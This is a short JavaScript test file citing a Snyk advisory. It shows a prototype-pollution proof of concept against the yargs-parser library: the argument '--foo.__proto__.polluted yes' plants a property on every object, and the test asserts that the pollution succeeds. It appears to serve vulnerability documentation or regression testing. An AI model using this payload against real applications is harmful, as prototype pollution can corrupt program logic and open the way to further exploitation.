//https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381

test("prototype pollution in yargs-parser", () => {
  expect({}.polluted).toBe(undefined);

  const parser = require("yargs-parser");

  parser("--foo.__proto__.polluted yes");

  expect({}.polluted).toBe("yes");
});
